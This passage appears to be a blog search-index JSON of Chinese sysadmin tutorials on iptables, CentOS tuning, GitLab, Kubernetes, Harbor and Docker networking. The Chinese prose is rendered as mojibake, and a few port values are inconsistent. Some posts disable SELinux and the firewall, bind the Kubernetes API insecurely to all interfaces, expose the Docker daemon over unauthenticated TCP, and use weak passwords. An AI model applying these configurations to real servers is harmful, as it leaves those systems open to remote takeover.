tcp â€“dport 22 -j ACCEPT ä¿¡ä»»æ¥æºIPï¼š iptables -A INPUT -s 10.0.0.0/24Â -j ACCEPT å¼€æ”¾å›ç¯åœ°å€è®¿é—®ï¼š iptables -A INPUT -i lo -j ACCEPT ","date":"2019-08-10 21:51","objectID":"/post/767/:0:0","tags":["iptables"],"title":"iptablesçš„filterè¡¨å¸¸ç”¨æ“ä½œ","uri":"/post/767/"},{"categories":["åŸºç¡€å†…å®¹"],"content":"1.ä¿®æ”¹ssh /etc/ssh/sshd_config UseDNS no GSSAPIAuthentication no 2.å…³é—­selinux,NetworkManager. è®¾ç½®iptables systemctl stopÂ NetworkManager systemctl disable NetworkManager sed -i â€™s#SELINUX=enforcing#SELINUX=disabled#â€™ /etc/selinux/config 3.é…ç½®yumæº centos7ï¼š curl -o /etc/yum.repos.d/CentOS-Base.repo http://mirrors.aliyun.com/repo/Centos-7.repo curl -o /etc/yum.repos.d/epel.repo http://mirrors.aliyun.com/repo/epel-7.repo centos6ï¼š curl -o /etc/yum.repos.d/CentOS-Base.repo http://mirrors.aliyun.com/repo/Centos-6.repo curl -o /etc/yum.repos.d/epel.repo http://mirrors.aliyun.com/repo/epel-6.repo 4.å®‰è£…å¸¸ç”¨è½¯ä»¶ yum install -y vim tree wget bash-completion wget lsof nmap nc lrzsz telnet bind-utils psmisc net-tools ntpdate 5.æ—¶é—´åŒæ­¥ ntpdate ntp1.aliyun.com \u0026\u003e/dev/null ","date":"2019-08-09 19:58","objectID":"/post/759/:0:0","tags":[],"title":"centosç³»ç»ŸåŸºç¡€ä¼˜åŒ–","uri":"/post/759/"},{"categories":["åŸºç¡€å†…å®¹","å¸¸ç”¨å‘½ä»¤"],"content":"centos6ï¼š yum install -y httpd httpd-devel mysql-devel mysql-server mysql php php-mysql gd php-gd gd-devel php-xml php-common php-mbstring php-ldap php-pear php-xmlrpc php-imap service httpd start service mysqld start mysqladmin -u root password xxxxx centos7ï¼š yum install -y httpd httpd-devel php php-mysql gd php-gd gd-devel php-xml php-common php-mbstring php-ldap php-pear php-xmlrpc php-imap mariadb mariadb-devel mariadb-server systemctl enable httpd systemctl start httpd systemctl enable mariadb systemctl start mariadb mysqladmin -u root password xxxxx å®‰è£…php7 rpmÂ -UvhÂ https://mirror.webtatic.com/yum/el7/webtatic-release.rpm yum -y install php71w php71w-cli php71w-common php71w-devel php71w-embedded php71w-gd php71w-mcrypt php71w-mbstring php71w-pdo php71w-xml php71w-fpm php71w-mysqlnd php71w-opcache php71w-pecl-memcached php71w-pecl-redis php71w-pecl-mongodb ","date":"2019-08-02 21:22","objectID":"/post/737/:0:0","tags":["lamp"],"title":"centos-yumå¿«é€Ÿéƒ¨ç½²lampç›¸å…³","uri":"/post/737/"},{"categories":["åŸºç¡€å†…å®¹"],"content":"ä¸€ã€å®‰è£…gitlab 1.å®‰è£…gitlabä¾èµ– yum install -y curl policycoreutils-python openssh-server 2.ä¸‹è½½gitlabï¼ŒrpmåŒ… è‡ªé€‰ç‰ˆæœ¬ï¼šhttps://mirrors.tuna.tsinghua.edu.cn/gitlab-ce/yum/el7/ #ä¸‹è½½12.0.3ç‰ˆæœ¬(æ±‰åŒ–åŒ…ä¹Ÿæ˜¯12.0.3ï¼Œä¸¤ä¸ªè¦ä¸€æ ·) wget https://mirrors.tuna.tsinghua.edu.cn/gitlab-ce/yum/el7/gitlab-ce-12.0.3-ce.0.el7.x86_64.rpm #å®‰è£…gitlab rpm -ivh gitlab-ce-12.0.3-ce.0.el7.x86_64.rpm 3.ä¿®æ”¹é…ç½®æ–‡ä»¶ vim /etc/gitlab/gitlab.rb external_urlä¿®æ”¹ä¸ºä½ çš„ipæˆ–åŸŸå 4.é…ç½®é‚®ç®± vim /etc/gitlab/gitlab.rb #52è¡Œå·¦å³ gitlab_rails['gitlab_email_enabled'] = true gitlab_rails['gitlab_email_from'] = '742899387@qq.com' gitlab_rails['gitlab_email_display_name'] = 'soulchild-gitlab' #517è¡Œå·¦å³ gitlab_rails['smtp_enable'] = true gitlab_rails['smtp_address'] = \"smtp.qq.com\" gitlab_rails['smtp_port'] = 465 gitlab_rails['smtp_user_name'] = \"ä½ çš„é‚®ç®±\" gitlab_rails['smtp_password'] = \"æˆæƒç \" gitlab_rails['smtp_domain'] = \"qq.com\" gitlab_rails['smtp_authentication'] = \"login\" gitlab_rails['smtp_enable_starttls_auto'] = true gitlab_rails['smtp_tls'] = true 5.é‡æ–°ç”Ÿæˆé…ç½®æ–‡ä»¶å¹¶å¯åŠ¨æœåŠ¡ gitlab-ctl reconfigure gitlab-ctl status 6.æ‰“å¼€åœ°å€å°±å¯ä»¥è®¿é—®äº† äºŒã€æ±‰åŒ–ï¼ˆä¸¤ç§æ–¹å¼ï¼‰ è¦†ç›–æ–‡ä»¶æ–¹å¼ï¼š 1.ä¸‹è½½è§£å‹æ±‰åŒ–åŒ…ï¼ˆ12-0-stable-zhçš„éƒ¨åˆ†å¯ä»¥æ”¹æˆä½ çš„ç‰ˆæœ¬å·ï¼‰ ä¸‹è½½åœ°å€ï¼šhttps://gitlab.com/xhang/gitlab/tree/12-0-stable-zh tar xf gitlab-12-0-stable-zh.tar.gz 2.è¦†ç›–æ–‡ä»¶è¿›è¡Œæ±‰åŒ–(*æ±‰åŒ–åŒ…å’Œä½ çš„gitlabç‰ˆæœ¬ä¸€å®šè¦ä¸€æ ·) #å¤‡ä»½åŸæ–‡ä»¶ cp -rp /opt/gitlab/embedded/service/gitlab-rails{,.bak_$(date +%F)} #å°†æ±‰åŒ–åŒ…è¦†ç›–è¿‡å»(\\ä¹Ÿéœ€è¦æ•²) \\cp -rf ./* /opt/gitlab/embedded/service/gitlab-rails gitlab-ctl reconfigure gitlab-ctl start 3.å¯åŠ¨ç›¸å…³ç»„ä»¶æœåŠ¡ gitlab-ctl start #æ±‰åŒ–åå¯èƒ½ä¼šå‡ºç°502ï¼Œéœ€è¦å¤šç­‰ä¸€ä¼šå°±è¡Œäº† 4.æ±‰åŒ–ååˆ°gitlabåå¥½è®¾ç½®ä¸­è®¾ç½®ä¸ºç®€ä½“ä¸­æ–‡å°±å®Œç¾äº†ã€‚ æ‰“è¡¥ä¸çš„æ–¹å¼ï¼š 1.cloneè¡¥ä¸æ–‡ä»¶ git clone https://gitlab.com/xhang/gitlab.git 2.ç”Ÿæˆè¡¥ä¸æ–‡ä»¶ cdÂ gitlab #æŸ¥çœ‹gitlabç‰ˆæœ¬å· gitlab_version=$(sudo cat /opt/gitlab/embedded/service/gitlab-rails/VERSION) \u0026\u0026 echo $gitlab_version #æŸ¥çœ‹æ±‰åŒ–åŒ…ç‰ˆæœ¬å·ï¼ˆ*ä¸€å®šè¦ä¿è¯å’Œgitlabçš„ç‰ˆæœ¬å·ä¸€è‡´ï¼‰ cat VERSION #å¯¼å‡º patch ç”¨çš„ diff æ–‡ä»¶ git diff v${gitlab_version} v${gitlab_version}-zh \u003e ../${gitlab_version}-zh.diff 3.å¯¼å…¥æ±‰åŒ–è¡¥ä¸ gitlab-ctl stop cd ../ #å¯èƒ½ä¼šæç¤ºè®©ä½ è¾“å…¥æ–‡ä»¶è·¯å¾„ï¼Œä¸€è·¯å›è½¦å°±è¡Œäº†ã€‚ patch -d /opt/gitlab/embedded/service/gitlab-rails -p1 \u003c ${gitlab_version}-zh.diff 4.é‡æ–°åŠ è½½é…ç½®ï¼Œå¯åŠ¨æœåŠ¡ gitlab-ctl reconfigure gitlab-ctl restart ","date":"2019-08-01 20:43","objectID":"/post/729/:0:0","tags":["gitlab"],"title":"gitlabå®‰è£…å’Œæ±‰åŒ–çš„ä¸¤ç§æ–¹å¼","uri":"/post/729/"},{"categories":["kubernetes"],"content":"1.åˆ›å»ºèµ„æºï¼ˆâ€“recordå¯ä»¥è®°å½•å†å²ç‰ˆæœ¬ï¼Œæ–¹ä¾¿å›æ»šï¼‰ kubectl create -f nginx-deploy.yaml --record nginx-deploy.yamlï¼š apiVersion: extensions/v1beta1 kind: Deployment metadata: name: nginx-deployment spec: replicas: 3 template: metadata: labels: app: nginx spec: containers: - name: nginx image: registry:5000/nginx:1.13 ports: - containerPort: 80 resources: limits: cpu: 100m requests: cpu: 100m 2.åˆ›å»ºsvcèµ„æº(æä¾›ç½‘ç»œè®¿é—®ã€æš´éœ²ç«¯å£) apiVersion: v1 kind: Service metadata: name: nginx-deployment spec: type: NodePort ports: - port: 80 nodePort: 3002 targetPort: 80 selector: app: nginx é•œåƒç‰ˆæœ¬å‡çº§å’Œå›æ»š å‡çº§é•œåƒï¼š #å‚æ•°è¯´æ˜ deploymentÂ :èµ„æºç±»å‹ nginx-deployment ï¼šèµ„æºåç§° nginx=registry:5000/nginx:1.15ï¼šç»™æŒ‡å®šçš„å®¹å™¨ä¿®æ”¹é•œåƒã€‚é€šè¿‡kubectl get rs -o wideæŸ¥çœ‹CONTAINER(S)ä¸­å®¹å™¨çš„åç§° kubectl set image deployment nginx-deployment nginx=registry:5000/nginx:1.15 æŸ¥çœ‹å†å²ç‰ˆæœ¬ï¼š #å‚æ•°è¯´æ˜ deployment ï¼šèµ„æºç±»å‹ nginx-deployment ï¼šèµ„æºåç§° kubectl rollout history deployment nginx-deployment å›æ»šåˆ°ä¸Šä¸€ä¸ªç‰ˆæœ¬ï¼š #å‚æ•°è¯´æ˜ deployment ï¼šèµ„æºç±»å‹ nginx-deployment ï¼šèµ„æºåç§° kubectl rollout undo deployment nginx-deployment å›æ»šåˆ°æŒ‡å®šç‰ˆæœ¬ï¼š #å‚æ•°è¯´æ˜ deployment ï¼šèµ„æºç±»å‹ nginx-deployment ï¼šèµ„æºåç§° --to-revision=2 ï¼šå›æ»šåˆ°æŒ‡å®šç‰ˆæœ¬ï¼Œé€šè¿‡historyå¯ä»¥æŸ¥çœ‹ kubectl rollout undo deployment nginx-deployment --to-revision=2","date":"2019-07-26 22:35","objectID":"/post/724/:0:0","tags":["k8s"],"title":"k8s-deploymentèµ„æºåˆ›å»ºã€å‡çº§ã€å›æ»š","uri":"/post/724/"},{"categories":["kubernetes"],"content":"é•œåƒéœ€è¦æå‰å‡†å¤‡å¥½ï¼Œregistry:5000æ˜¯æœ¬åœ°ç§æœ‰ä»“åº“åœ°å€ 1.åˆ›å»ºä¸€ä¸ªrcèµ„æº kubectl create -f nginx-rc.yaml nginx-rc.yamlï¼š apiVersion: v1 kind: ReplicationController metadata: name: nginx spec: replicas: 5 selector: app: myweb template: metadata: labels: app: myweb spec: containers: - name: myweb image: registry:5000/nginx:1.13 ports: - containerPort: 80 2.åˆ›å»ºsvcèµ„æº(æä¾›ç½‘ç»œè®¿é—®ã€æš´éœ²ç«¯å£) kubectl create -f nginx-svc.yaml nginx-svc.yamlï¼š apiVersion: v1 kind: Service metadata: name: myweb spec: type: NodePort ports: - port: 80 nodePort: 30001 targetPort: 80 selector: app: myweb 3.æŸ¥çœ‹podçŠ¶æ€ï¼Œéƒ½ä¸ºrunning kubectl get all -o wide æ‰“å¼€æµ‹è¯•è®¿é—®ï¼š http://10.0.0.13:3001 å°†nginx1.13å‡çº§åˆ°nginx1.15 é•œåƒå‡çº§ 1.æŒ‡å®šé•œåƒå‡çº§,æ¯10ç§’å‡çº§ä¸€ä¸ª kubectl rolling-update nginx --image=registry:5000/nginx:1.15 --update-period=10s yamlæ–‡ä»¶å‡çº§å’Œå›æ»š 2.åŸºäºyamlæ–‡ä»¶å‡çº§ kubectl rolling-update nginx -f nginx-rc1.15.yaml --update-period=10s #ä¿®æ”¹svcçš„æ ‡ç­¾é€‰æ‹©å™¨ä¸ºmyweb2 kubectl edit svc myweb selector: app: myweb2 nginx-rc1.15.yamlï¼š apiVersion: v1 kind: ReplicationController metadata: name: nginx2 spec: replicas: 5 selector: app: myweb2 template: metadata: labels: app: myweb2 spec: containers: - name: myweb2 image: registry:5000/nginx:1.15 ports: - containerPort: 80 å›æ»šï¼š kubectl rolling-update nginx2 -f nginx-rc.yaml --update-period=1s #ä¿®æ”¹svcçš„æ ‡ç­¾é€‰æ‹©å™¨ä¸ºmyweb kubectl edit svc myweb selector: app: myweb ","date":"2019-07-22 23:18","objectID":"/post/711/:0:0","tags":["k8s"],"title":"k8s-rcèµ„æºåˆ›å»ºã€æ»šåŠ¨å‡çº§","uri":"/post/711/"},{"categories":["kubernetes"],"content":"å®‰è£…å‰å‡†å¤‡ï¼š ç¯å¢ƒï¼š ä¸»æœº æœåŠ¡ ip k8s-master etcdã€ 10.0.0.11 k8s-node-1 k8s-node 10.0.0.12 k8s-node-2 k8s-node 10.0.0.13 æ‰€æœ‰ä¸»æœºé…ç½®hostsè§£æ 10.0.0.11Â k8s-master 10.0.0.12Â k8s-node-1 10.0.0.13Â k8s-node-2 å…³é—­é˜²ç«å¢™å’Œselinux systemctl stop firewalld setenforce 0 yumæºä½¿ç”¨çš„æ˜¯é˜¿é‡Œäº‘çš„ curl -o /etc/yum.repos.d/CentOS-Base.repo http://mirrors.aliyun.com/repo/Centos-7.repo kubernetesæ¶æ„å›¾ï¼š ä¸€ã€é¦–å…ˆé…ç½®k8s-master 1.k8s-masterå®‰è£…etcdï¼š yum install -y etcd 2.é…ç½®etcd vim /etc/etcd/etcd.conf #ä¿®æ”¹ä¸‹é¢ä¸‰é¡¹ ETCD_LISTEN_CLIENT_URLS=\"http://0.0.0.0:2379\" ETCD_NAME=\"k8s-master\" ETCD_ADVERTISE_CLIENT_URLS=\"http://10.0.0.11:2379\" #å¯åŠ¨æœåŠ¡ systemctl enable etcd systemctl start etcd #æµ‹è¯•ï¼Œæ­£å¸¸è®¾ç½®å’Œå–å€¼ [root@k8s-master ~]# etcdctl set test/k v v [root@k8s-master ~]# etcdctl get test/k v #æŸ¥çœ‹etcdå¥åº·çŠ¶æ€ [root@k8s-master ~]# etcdctl -C http://10.0.0.11:2379 cluster-health member 8e9e05c52164694d is healthy: got healthy result from http://10.0.0.11:2379 cluster is healthy 3.å®‰è£…kubernetes-master yum install -y kubernetes-master 4.é…ç½®apiserver vim /etc/kubernetes/apiserver # ä¿®æ”¹ä¸‹é¢äº”é¡¹ KUBE_API_ADDRESS=\"--insecure-bind-address=0.0.0.0\" KUBE_API_PORT=\"--port=8080\" KUBELET_PORT=\"--kubelet-port=10250\" KUBE_ETCD_SERVERS=\"--etcd-servers=http://10.0.0.11:2379\" KUBE_ADMISSION_CONTROL=\"--admission-control=NamespaceLifecycle,NamespaceExists,LimitRanger,SecurityContextDeny,ResourceQuota\" 5.æŒ‡å®šapiserveråœ°å€ï¼Œç»™controller-managerå’Œschedulerä½¿ç”¨ vim /etc/kubernetes/config KUBE_MASTER=\"--master=http://10.0.0.11:8080\" 6.å¯åŠ¨æœåŠ¡ systemctl enable kube-apiserver systemctl enable kube-controller-manager systemctl enable kube-scheduler systemctl restart kube-apiserver systemctl restart kube-controller-manager systemctl restart kube-scheduler 7.æ£€æŸ¥å…¶ä»–ç»„ä»¶çš„çŠ¶æ€ [root@k8s-master ~]# kubectl get componentstatus NAME STATUS MESSAGE ERROR etcd-0 Healthy {\"health\":\"true\"} scheduler Healthy ok controller-manager Healthy ok äºŒã€é…ç½®nodeèŠ‚ç‚¹(node2ä¹Ÿæ˜¯åŒæ ·é…ç½®) 1.å®‰è£…kubernetes-node yum install -y kubernetes-node 2.ä¿®æ”¹kubeletï¼Œæ³¨æ„hostnameï¼Œæ¯ä¸ªèŠ‚ç‚¹éœ€è¦ä¸åŒçš„åå­— vim /etc/kubernetes/kubelet KUBELET_ADDRESS=\"--address=0.0.0.0\" KUBELET_PORT=\"--port=10250\" KUBELET_HOSTNAME=\"--hostname-override=k8s-node-1\" KUBELET_API_SERVER=\"--api-servers=http://10.0.0.11:8080\" 3.æŒ‡å®šapiserveråœ°å€ï¼Œç»™kube-proxyä½¿ç”¨ vim /etc/kubernetes/config KUBE_MASTER=\"--master=http://10.0.0.11:8080\" 4.å¯åŠ¨æœåŠ¡ systemctl enable kubelet systemctl enable kube-proxy systemctl restart kubelet.service systemctl restart kube-proxy.service åœ¨masterä¸ŠæŸ¥çœ‹nodeèŠ‚ç‚¹ kubectl get nodes NAME STATUS AGE k8s-node-1 Ready 1m k8s-node-2 Ready 3s è‡³æ­¤k8så·²ç»è£…å®Œäº†ï¼Œæ¥ä¸‹æ¥é…ç½®ä¸åŒå®¿ä¸»æœºä¹‹é—´å®¹å™¨çš„é€šä¿¡ï¼Œè¿™é‡Œä½¿ç”¨çš„flannelã€‚ å®‰è£…é…ç½®flannel 1.æ‰€æœ‰èŠ‚ç‚¹å®‰è£…flannel yum install -y flannel systemctl enable flanneld 2.ä¿®æ”¹fannelé…ç½®,ä¸‰å°æœºå™¨éƒ½åšæ­¤æ“ä½œ vim /etc/sysconfig/flanneld FLANNEL_ETCD_ENDPOINTS=\"http://10.0.0.11:2379\" #ä¹Ÿå¯ä»¥ä½¿ç”¨sedæ›¿æ¢ sed -i s#127.0.0.1:2379#10.0.0.11:2379#g /etc/sysconfig/flanneld 3.é€šè¿‡etcdé…ç½®ipåœ°å€èŒƒå›´ï¼ˆkey:valueå½¢å¼ï¼‰ etcdctl mk /atomic.io/network/config '{\"Network\":\"172.16.0.0/16\"}' 4.é‡å¯æœåŠ¡ masterèŠ‚ç‚¹éœ€è¦è‡ªè¡Œå®‰è£…dockerï¼Œé…ç½®å®Œflannelä¹Ÿéœ€è¦é‡å¯dockerã€‚ masterèŠ‚ç‚¹ï¼š systemctl restart flanneld systemctl restart kube-apiserver systemctl restart kube-controller-manager systemctl restart kube-scheduler nodeèŠ‚ç‚¹ï¼š systemctl restart flanneld systemctl restart docker systemctl restart kubelet systemctl restart kube-proxy docker1.13ç‰ˆæœ¬ä¸­çš„ä¸€ä¸ªé—®é¢˜ï¼Œéœ€è¦ä¿®æ”¹iptablesï¼Œå¦åˆ™å®¹å™¨ä¹‹é—´ä¸é€šã€‚ vim /usr/lib/systemd/system/docker.service ExecStartPost=/sbin/iptables -P FORWARD ACCEPT systemctl daemon-reload systemctl restart docker ","date":"2019-07-20 17:56","objectID":"/post/681/:0:0","tags":["k8s"],"title":"yumæ–¹å¼å®‰è£…éƒ¨ç½²k8sé›†ç¾¤","uri":"/post/681/"},{"categories":["è™šæ‹ŸåŒ–","docker"],"content":"ç¯å¢ƒï¼š 10.0.0.11Â harbor 10.0.0.12Â registry å®ç°æ€è·¯ï¼š è·å–registryä»“åº“é•œåƒâ€“\u003eè·å–registryä»“åº“é•œåƒçš„æ ‡ç­¾â€“\u003eæ¯ä¸ªé•œåƒæ‰“å¥½harborä»“åº“æ ‡ç­¾â€“\u003eä¸Šä¼ è‡³harborä»“åº“ 1.å‡†å¤‡å·¥å…·jq yum install -y jq 2.harborä¸­åˆ›å»ºä¸€ä¸ªé¡¹ç›®registry æˆ‘çš„æ“ä½œéƒ½æ˜¯åœ¨10.0.0.12ä¸Šæ“ä½œçš„ï¼Œæ‰€ä»¥åœ¨æ‰§è¡Œè„šæœ¬å‰éœ€è¦åšä¸€äº›å…¶ä»–å·¥ä½œï¼š #ç™»å½•harborä»“åº“ï¼Œä¸Šä¼ é•œåƒéœ€è¦ docker login soulchild.cn #soulchild.cnéœ€è¦å•ç‹¬åšä¸€ä¸‹è§£æï¼Œharborä»“åº“åœ°å€ä¸º10.0.0.11 echo \"10.0.0.11 soulchild.cn\" \u003e\u003e /etc/hosts 3.ç¼–å†™è„šæœ¬(åœ¨registryä¸­æ‰§è¡Œï¼Œè¿™æ ·å¯ä»¥çœå»pullé•œåƒçš„æ­¥éª¤ï¼Œç›´æ¥ä¸Šä¼ åˆ°harborå³å¯) #!/bin/bash images=`curl -s -u test:test 10.0.0.12:5000/v2/_catalog | jq .repositories[] | tr -d '\"'` for image in $images; do tags=`curl -s -u test:test 10.0.0.12:5000/v2/$image/tags/list | jq .tags[] | tr -d '\"'` for tag in $tags; do docker tag 10.0.0.12:5000/$image:$tag soulchild.cn/registry/$image:$tag docker push soulchild.cn/registry/$image:$tag if [ $? -eq 0 ];then echo \"###############################$image:$tag pull complete!###############################\" else echo \"$image:$tag pull failure!\" fi done done è„šæœ¬æ‰§è¡Œå®Œåå¯ä»¥å‘ç°harborä»“åº“ä¸­é•œåƒå·²ç»ä¼ è¾“å®Œæˆäº†ã€‚ ","date":"2019-07-19 00:17","objectID":"/post/691/:0:0","tags":["docker"],"title":"å°†registryä»“åº“é•œåƒè¿ç§»è‡³harborä¸­","uri":"/post/691/"},{"categories":["è™šæ‹ŸåŒ–","docker"],"content":"è‡ªç­¾åè¯ä¹¦ï¼š https://www.cnblogs.com/Rcsec/p/8479728.html è¿›å…¥åˆ°harborç›®å½•æ“ä½œï¼š 1.ç¼–è¾‘harbor.ymlä¿®æ”¹ä»¥ä¸‹éƒ¨åˆ†,httpséƒ¨åˆ†éœ€è¦å–æ¶ˆæ³¨é‡Š hostname: soulchild.cn # https related config https: # # https port for harbor, default is 443 port: 443 # # The path of cert and key files for nginx certificate: /data/cert/myharbor.cert private_key: /data/cert/myharbor.key 2.æ·»åŠ hostsè§£æ echo â€œ10.0.0.11Â soulchild.cnâ€ \u003e\u003e /etc/hosts 3.é…ç½®è¯ä¹¦æ–‡ä»¶ #ä¸Šä¼ è¯ä¹¦è‡³æ­¤æ–‡ä»¶å¤¹ mkdir /data/cert/ #ä¸¤ä¸ªæ–‡ä»¶ ls /data/cert/ myharbor.crt myharbor.key 4.ç”Ÿæˆé…ç½®æ–‡ä»¶ ./prepare 5.åœæ­¢harbor docker-compose down -v å¯ä»¥æå‰æ‰§è¡Œï¼Œå¤ªæ…¢äº†ã€‚ 6.å¼€å¯harbor docker-compose up -d 7.æµ‹è¯• #æ­£å¸¸ç™»é™† docker login soulchild.cn #pullé•œåƒä¹Ÿæ²¡æœ‰é—®é¢˜ docker pull soulchild.cn/soulchild/busybox:1.18 ","date":"2019-07-18 21:40","objectID":"/post/686/:0:0","tags":["docker"],"title":"ç»™harborç§æœ‰ä»“åº“é…ç½®https","uri":"/post/686/"},{"categories":["è™šæ‹ŸåŒ–","docker"],"content":"1.åˆ é™¤æ—§ç‰ˆæœ¬ yum remove docker yum remove docker-common 2.å®‰è£…dockeræº curl -o /etc/yum.repos.d/docker-ce.repo https://mirrors.aliyun.com/docker-ce/linux/centos/docker-ce.repo 3.å®‰è£…æ–°ç‰ˆæœ¬ yum install -y docker-ce 4.é…ç½®æ–‡ä»¶å˜æˆäº†daemon.json.rpmsave,ä¿®æ”¹é…ç½®æ–‡ä»¶åç§° mv /etc/docker/daemon.json{.rpmsave,} 5.å¯åŠ¨æœåŠ¡ systemctl start docker systemctl enable docker å®‰è£…å®Œåæ—§ç‰ˆæœ¬çš„å®¹å™¨è¿˜åœ¨ã€‚ ","date":"2019-07-18 01:35","objectID":"/post/678/:0:0","tags":["docker"],"title":"dockerå‡çº§æ–°ç‰ˆæœ¬yumæ–¹å¼","uri":"/post/678/"},{"categories":["è™šæ‹ŸåŒ–","docker"],"content":"dockerç‰ˆæœ¬è¦æ±‚ï¼š17.06.0 æˆ–æ›´é«˜ docker-composeç‰ˆæœ¬è¦æ±‚ï¼šversion 1.18.0æˆ–æ›´é«˜ åœ¨çº¿å®‰è£…ï¼š ä¸‹è½½åœ°å€ï¼šhttps://storage.googleapis.com/harbor-releases/release-1.8.0/harbor-online-installer-v1.8.1.tgz wget https://storage.googleapis.com/harbor-releases/release-1.8.0/harbor-online-installer-v1.8.1.tgz tar xfÂ harbor-online-installer-v1.8.1.tgz cd harbor #ä¿®æ”¹ä¸»æœºåå’Œç®¡ç†å‘˜å¯†ç ã€æ•°æ®åº“å¯†ç  vim harbor.yml hostname: 10.0.0.11 harbor_admin_password: 123456 database: password: 123456 #å®‰è£… ./install.sh #æ¥ä¸‹æ¥å°±æ˜¯æ¼«é•¿çš„ç­‰å¾… ç¦»çº¿å®‰è£…ï¼š ä¸‹è½½åœ°å€ï¼šhttps://storage.googleapis.com/harbor-releases/release-1.8.0/harbor-offline-installer-v1.8.1.tgz tar xfÂ harbor-offline-installer-v1.8.1.tgz cd harbor #ä¸»è¦ä¿®æ”¹ä¸‰ä¸ªåœ°æ–¹ï¼Œä¹Ÿå¯ä»¥æ ¹æ®è‡ªå·±éœ€æ±‚ä¿®æ”¹egrep -v '^$|#' harbor.yml vimÂ harbor.yml hostname: 10.0.0.12 harbor_admin_password: 123456 database: password: 123456 #å®‰è£… ./install.sh ","date":"2019-07-18 01:08","objectID":"/post/675/:0:0","tags":["docker"],"title":"dockerç§æœ‰ä»“åº“harbor1.8.1å®‰è£…éƒ¨ç½²","uri":"/post/675/"},{"categories":["è™šæ‹ŸåŒ–","docker"],"content":"ç¯å¢ƒï¼šä¸‰å°centos7éƒ½æœ‰docker docker01ï¼š10.0.0.11 docker02ï¼š10.0.0.12 consulï¼š10.0.0.13 1.éƒ¨ç½²consul -hï¼šè®¾ç½®å®¹å™¨ä¸»æœºå docker run -d -p 8500:8500 -h consul --name consul --restart=always progrium/consul -server -bootstrap 2.ä¿®æ”¹docker01å’Œdocker02é…ç½®æ–‡ä»¶ [root@docker01 ~]# cat /etc/docker/daemon.json { \"hosts\":[\"tcp://0.0.0.0:2376\",\"unix:///var/run/docker.sock\"], \"cluster-store\": \"consul://10.0.0.13:8500\", \"cluster-advertise\": \"10.0.0.11:2376\" } ############################################################################# [root@docker02 ~]# cat /etc/docker/daemon.json { \"hosts\":[\"tcp://0.0.0.0:2376\",\"unix:///var/run/docker.sock\"], \"cluster-store\": \"consul://10.0.0.13:8500\", \"cluster-advertise\": \"10.0.0.12:2376\" } 3.ä¿®æ”¹æœåŠ¡å¯åŠ¨é…ç½®æ–‡ä»¶ vim /usr/lib/systemd/system/docker.service å°†ï¼šExecStart=/usr/bin/dockerd -H fd:// â€“containerd=/run/containerd/containerd.sock ä¿®æ”¹ä¸ºï¼šExecStart=/usr/bin/dockerd â€“containerd=/run/containerd/containerd.sock ä¿®æ”¹å®Œåé‡å¯docker systemctl daemon-reload systemctl restart docker 4.æŸ¥çœ‹æ³¨å†Œï¼Œå·²ç»å­˜åœ¨ä¸¤ä¸ªdockerèŠ‚ç‚¹äº†ã€‚ http://10.0.0.13:8500/ui/#/dc1/kv/docker/nodes/ 5.åˆ›å»ºoverlayç½‘ç»œ éšä¾¿ä¸€å°dockerä¸Šæ‰§è¡Œï¼Œå…¶ä»–å·²æ³¨å†Œçš„èŠ‚ç‚¹ä¹Ÿä¼šåˆ›å»ºoverlayç½‘ç»œ docker network create --driver overlay --subnet 172.16.1.0/24 --gateway 172.16.1.254 overlay_1 6.åˆ›å»ºå®¹å™¨æµ‹è¯• docker run -it --network overlay_1 busybox ä¸¤å°åˆ†åˆ«åˆ›å»ºï¼Œäº’ç›¸å¯ä»¥pingé€š ","date":"2019-07-17 22:35","objectID":"/post/670/:0:0","tags":["docker"],"title":"dockerä¸­overlayç½‘ç»œ","uri":"/post/670/"},{"categories":["è™šæ‹ŸåŒ–","docker"],"content":"å®ç°ä¸åŒå®¿ä¸»æœºä¸­çš„å®¹å™¨é€šä¿¡ 1.åˆ›å»ºmacvlanç½‘ç»œ â€“driver æŒ‡å®šç½‘ç»œç±»å‹macvlan â€“subnet æŒ‡å®šä¸€ä¸ªç½‘æ®µ(æ ¹æ®çœŸå®ç¯å¢ƒå¡«å†™) â€“gateway æŒ‡å®šç½‘å…³(æ ¹æ®çœŸå®ç¯å¢ƒå¡«å†™) -o parent=eth0 æŒ‡å®šå®¿ä¸»æ¥å£ macvlan_1 è‡ªå®šä¹‰çš„ç½‘ç»œåç§° docker network create --driver macvlan --subnet 10.0.0.0/24 --gateway 10.0.0.254 -o parent=eth0 macvlan_1 2.åˆ›å»ºå®¹å™¨ docker01ï¼š docker run -it --network macvlan_1 --ip=10.0.0.1 busybox docker02ï¼š docker run -it --network macvlan_1 --ip=10.0.0.2 busybox æ­¤æ—¶ï¼Œä¸¤ä¸ªå®¹å™¨å¯ä»¥äº’é€šï¼Œä¹Ÿéƒ½å¯ä»¥pingé€šå¤–ç½‘ï¼Œä½†æ˜¯ä¸èƒ½pingé€šè‡ªå·±çš„å®¿ä¸»æœºã€‚ ","date":"2019-07-17 20:56","objectID":"/post/666/:0:0","tags":["docker"],"title":"dockerä¸­macvlanç½‘ç»œ","uri":"/post/666/"},{"categories":["è™šæ‹ŸåŒ–","docker"],"content":"Noneï¼šä¸ä½¿ç”¨ç½‘ç»œã€‚ä½¿ç”¨æ–¹å¼ï¼šâ€“network=none Hostï¼šä¸å®¿ä¸»æœºå…¬ç”¨ç½‘ç»œã€‚ä½¿ç”¨æ–¹å¼ï¼šâ€“network=host Containerï¼šä¸å…¶ä»–å®¹å™¨å…¬ç”¨ç½‘ç»œã€‚â€“network=container:\u003cname or id\u003e Bridgeï¼šæ¡¥æ¥docker0ç½‘å¡ã€‚â€“network=bridge ","date":"2019-07-17 20:33","objectID":"/post/663/:0:0","tags":["docker"],"title":"dockerçš„å››ç§ç½‘ç»œç±»å‹","uri":"/post/663/"},{"categories":["è™šæ‹ŸåŒ–","docker"],"content":"å¯åŠ¨æ–°å®¹å™¨æ—¶ docker run â€“restart=always ä¿®æ”¹å·²åœ¨ä½¿ç”¨çš„å®¹å™¨ docker updateÂ â€“restart=always ","date":"2019-07-17 19:24","objectID":"/post/661/:0:0","tags":["docker"],"title":"dockerè‡ªåŠ¨å¯åŠ¨å®¹å™¨","uri":"/post/661/"},{"categories":["è™šæ‹ŸåŒ–","docker"],"content":"1.å®‰è£…docker-compose, æ–¹æ³•1. åœ¨epelæºä¸­ç›´æ¥yumå®‰è£… yum install -y docker-compose æ–¹æ³•2.ä½¿ç”¨pipå®‰è£… yum -y install python-pip pip install docker-compose 2.åˆ›å»ºå·¥ä½œç›®å½•,ç¼–å†™docker-composeæ–‡ä»¶ mkdir /opt/myzabbix 